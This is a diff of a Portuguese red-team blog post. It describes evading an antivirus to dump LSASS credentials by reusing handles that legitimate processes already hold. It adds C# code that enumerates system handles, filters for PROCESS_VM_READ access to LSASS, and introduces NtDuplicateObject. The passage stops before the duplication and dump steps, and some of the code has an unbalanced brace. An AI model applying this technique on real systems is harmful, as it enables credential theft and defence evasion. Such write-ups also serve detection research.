@@ -1,18 +1,18 @@
 ---
-title: "LSASS: A reciclagem também está presente nos handles."
+title: "A reciclagem também está presente nos handles."
 date: 2023-06-03 00:00:00 +0800
-categories: [Windows]
+categories: [Windows, LSASS]
 tags: [Red Team]
 ---
 
-Como sabemos, o processo do LSASS é um tesouro quando se observado pelo lado ofensivo. É neste processo que informações de logons de usuários são armazenados (como as valiosas NT hashes). Quando o assunto é dump de credenciais, um handle com permissões de `PROCESS_VM_READ` ao LSASS se torna tudo o que um atacante quer.
+Como sabemos, o processo do LSASS é um tesouro quando se observado pelo lado ofensivo. É neste processo que informações de logons de usuários são armazenadas (como as valiosas NT hashes). Quando o assunto é dump de credenciais, um handle com permissões de `PROCESS_VM_READ` ao LSASS se torna tudo o que um atacante quer.
 
 > - `PROCESS_VM_READ¹`: permissão necessária para a leitura da memória (dump) de um processo. 
 {: .prompt-info }
 
 Nos últimos tempos, estive me aprofundando em técnicas de dump de LSASS que normalmente um EDR/XDR não detectaria. Em um laboratório, instalei um famoso antivírus do mercado (no qual não citarei o nome) e que me rendeu bastante trabalho. Quando eu abria um novo handle pro LSASS e tentava interagí-lo, um erro era retornado: `STATUS_ACCESS_DENIED`.
 
-![Desktop View](https://i.imgur.com/RBZ4JSv.png)
+![Desktop View](https://i.imgur.com/wihqqna.png)
 
 No código, primeiro é aberto um novo handle pro LSASS com o privilégio `PROCESS_CREATE_PROCESS²`. Como exibido na captura de tela acima, o erro ocorria na execução da API `NtCreateProcessEx³`.
 
@@ -50,7 +50,7 @@ if (ningning == 0)
 > - `NtCreateProcessEx³`: API utilizada para criar um fork do processo LSASS. 
 {: .prompt-info }
 
-Note que foi solicitada a abertura de um novo handle ao LSASS na linha 4 do código. Nele, é especificado que será aberto com os privilégios de `PROCESS_CREATE_PROCESS`. Entretanto, como vimos, um erro de `ACCESS DENIED` é retornado. Pausando a execução do código e partindo para a análise do handle recém-aberto utilizando o programa "Process Hacker", nos deparamos com algo bastante interessante:
+Note que foi solicitada a abertura de um novo handle ao LSASS na linha 4 do código. Nele, é especificado que será aberto com os privilégios de `PROCESS_CREATE_PROCESS`. Entretanto, como vimos, um erro de `ACCESS DENIED` é retornado. Pausando a execução do código e partindo para a análise do handle recém-aberto utilizando o programa Process Hacker, nos deparamos com algo bastante interessante:
 
 ![Desktop View](https://i.imgur.com/RUkXM62.png)
 
@@ -60,7 +60,7 @@ Descobrimos o motivo do erro! Ao solicitar a abertura de um novo handle ao LSASS
 
 ### Handles também podem ser reciclados!
 
-Como foi visto, não é possível solicitar a abertura de um handle ao LSASS sem que o AV barre a atribuição dos privilégios necessários para o dump. Mas, e se algum programa legítimo já tiver aberto um handle? A pergunta é facilmente respondida com o "Process Hacker". Nele, uma funcionalidade que busca por handles filtrados pelo nome.
+Como foi visto, não é possível solicitar a abertura de um handle ao LSASS sem que o AV barre a atribuição dos privilégios necessários para o dump. Mas, e se algum programa legítimo já tiver aberto um handle? A pergunta é facilmente respondida com o Process Hacker. Nele, uma funcionalidade que busca por handles filtrados pelo nome.
 
 ![Desktop View](https://i.imgur.com/gyyW0Vw.png)
 
@@ -110,7 +110,7 @@ Esta é uma API fundamental para todo o processo. Ela é do tipo `NTSTATUS⁶` e
 
 - `SystemInformationClass`: uma tabela de valores sobre informações do sistema operacional. Neste caso, é necessário somente o valor `SystemHandleInformation⁷`, representado pelo número 16 em hexadecimal.
 - `SystemInformation`: a saída da API. É um ponteiro que armazena as informações solicitadas. Neste caso, as informações dos handles em abertos.
-- `SystemInformationLength`: o tamanho do buffer, em bytes, apontado pelo SystemInformation.
+- `SystemInformationLength`: o tamanho do buffer, em bytes, apontado pelo `SystemInformation`.
 - `ReturnLength`: um ponteiro representando o local onde a função vai escrever o tamanho da informação solicitada pela API. Se o tamanho do `ReturnLength` for menor ou igual ao `SystemInformationLength`, a informação será escrita dentro do `SystemInformation`. Caso contrário, retorna o tamanho do buffer necessário para receber o resultado.
 
 > - `NTSTATUS⁶`: lista de valores que são representados como status code. Bastante utilizada em APIs.
@@ -153,3 +153,78 @@ Console.WriteLine($"[+] Número de handles: {numberOfHandles}");
 ```
 
 ![Desktop View](https://i.imgur.com/G8XcKmQ.png)
+
+Feito isso, o próximo objetivo é analisar os handles que estão abertos e armazenados no `systemInformationPtr`. Não é uma tarefa tão fácil, já que precisamos acessar handle por handle e realizar uma consulta na tabela `SYSTEM_HANDLE_TABLE_ENTRY_INFO` para descobrirmos seu PID, por exemplo. Com isso, é criado um dicionário que armazenará informações sobre os handles.
+Posteriormente, um loop que passará por todos os handles através do `numberOfHandles`. É neste loop que iteraremos sobre seus respectivos PIDs e, depois, sobre seus níveis de acesso.
+
+```csharp
+public static void IterateHandles(long numberOfHandles, IntPtr systemInformationPtr)
+{
+	var handleEntryPtr = new IntPtr((long)systemInformationPtr + sizeof(long)); // apontando para o tamanho do numberOfHandles (primeiros 8 bytes)
+
+	Dictionary<int, List<Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO>> handles = new(); // criando um dicionário
+
+	for (var i = 0; i < numberOfHandles; i++) // percorrendo por todos os handles
+	{
+		var handleTableEntry = (Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(handleEntryPtr, typeof(Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO)); // variável acessando a tabela SYSTEM_HANDLE_TABLE_ENTRY_INFO
+
+		handleEntryPtr = new IntPtr((long)handleEntryPtr + Marshal.SizeOf(handleTableEntry)); // avançando o ponteiro para a próxima entrada
+		
+		if (!handles.ContainsKey(handleTableEntry.UniqueProcessId)) // acessando a tabela SYSTEM_HANDLE_TABLE_ENTRY_INFO, verificar o UniqueProcessId
+		{
+			handles.Add(handleTableEntry.UniqueProcessId, new List<Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO>());
+			// adicionando o PID se ele ainda não tiver catalogado no dicionário
+		}
+
+		handles[handleTableEntry.UniqueProcessId].Add(handleTableEntry);
+}
+
+Marshal.FreeHGlobal(systemInformationPtr);
+
+Netdump.Invokes.CloseHandle(handleEntryPtr);
+Netdump.Invokes.CloseHandle(systemInformationPtr);
+```
+
+Agora que as informações que precisamos estão armazenadas no dicionário, precisamos criar um `foreach` para acessarmos elas de uma por uma. As informações que analisaremos são somente duas: PID e AccessRights. Como são muitos handles, com muitos PIDs diferentes, será criado um `if` para filtrar somente pelo PID que contém o handle pro LSASS (como foi visto pelo Process Hacker).
+
+```csharp
+public enum PROCESS_ACCESS : uint // struct contendo algumas permissões de processos.
+{								  // neste caso, precisamos somente da PROCESS_VM_READ, mas fica ao seu critério.
+	PROCESS_TERMINATE = 0x0001,
+	PROCESS_CREATE_THREAD = 0x0002,
+	PROCESS_SET_SESSIONID = 0x0004,
+	PROCESS_VM_OPERATION = 0x0008,
+	PROCESS_VM_READ = 0x0010,
+	PROCESS_VM_WRITE = 0x0020,
+	PROCESS_DUP_HANDLE = 0x0040,
+	PROCESS_CREATE_PROCESS = 0x0080,
+	PROCESS_SET_QUOTA = 0x0100,
+	PROCESS_SET_INFORMATION = 0x0200,
+	PROCESS_QUERY_INFORMATION = 0x0400
+}
+
+foreach (var index in handles)
+{
+	foreach(var handleStruct in index.Value) // handleStruct = SYSTEM_HANDLE_TABLE_ENTRY_INFO
+	{
+		Netdump.Tables.PROCESS_ACCESS grantedAccess = (Netdump.Tables.PROCESS_ACCESS)handleStruct.GrantedAccess;
+		if (grantedAccess.HasFlag(Netdump.Tables.PROCESS_ACCESS.PROCESS_VM_READ))
+		{
+			if (index.Key == 6020)
+			{
+				foreach (Netdump.Tables.PROCESS_ACCESS accessRight in Enum.GetValues(typeof(Netdump.Tables.PROCESS_ACCESS)))
+				{
+					Console.WriteLine($"O identificador do handle é: {handleStruct.HandleValue}. e seus privilégios são: {accessRight.ToString()}");
+				}
+			}
+		}
+	}
+}
+```
+
+![Desktop View](https://i.imgur.com/J4yNvkg.png)
+
+#### NtDuplicateObject⁸
+
+> - `NtDuplicateObject⁸`: API utilizada para duplicar um handle alvo.
+{: .prompt-info }
